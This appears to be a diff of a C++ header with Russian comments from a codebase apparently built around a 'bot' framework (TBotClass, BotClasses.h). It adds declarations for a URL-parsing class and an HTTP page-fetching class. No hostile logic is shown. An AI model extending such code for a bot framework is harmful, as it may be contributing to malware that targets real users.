@@ -16,6 +16,7 @@
 #include <WinSock.h>
 
 #include "GetApi.h"
+#include "Strings.h"
 #include "BotClasses.h"
 
 // Названия основных методов HTTP запроса
@@ -35,10 +36,6 @@ const PCHAR HTTPMethodTRACE = "TRACE";
 // Основные версии HTTP протокола
 const PCHAR HTTPProtocolVersion_1_0 = "HTTP/1.0";
 const PCHAR HTTPProtocolVersion_1_1 = "HTTP/1.1";
-
-const PCHAR ProtocolHTTP  = "http";
-const PCHAR ProtocolHTTPS = "https";
-const PCHAR HTTPProtocolDelimeter = "://";
 
 const PCHAR HTTPNoCache = "no-cashe";
 
@@ -425,6 +422,45 @@ typedef struct THTTPSessionInfo{
 	PCHAR URL;          // Адрес загружаемого ресурса
 } *PHTTPSessionInfo;
 
+
+// ***************************************************************************
+// ***************************************************************************
+
+//----------------------------------------------------------------
+//   TURL  - Класс для работы синтернет адресами
+//----------------------------------------------------------------
+class TURL : public TBotClass
+{
+public:
+	string Protocol;
+	string Host;
+	string Path;
+	string Document;
+	string Params;
+	WORD Port;
+
+	TURL(const char *URL = NULL);
+
+	void Clear();
+	bool Parse(const char *URL);
+	string URL(); // Функция собирает полный адрес
+
+private:
+    bool DoParse(const char *URL);
+};
+
+
+//----------------------------------------------------------------
+//   THTTP  - Класс для передачи-приёма данных по HTTP протоколу
+//----------------------------------------------------------------
+class THTTP : public TBotClass
+{
+public:
+	THTTP() {};
+	// Функция загружает страницу с указанного адреса
+	string Get(const string &URL);
+private:
+};
 
 //---------------------------------------------------------------------------
 #endif
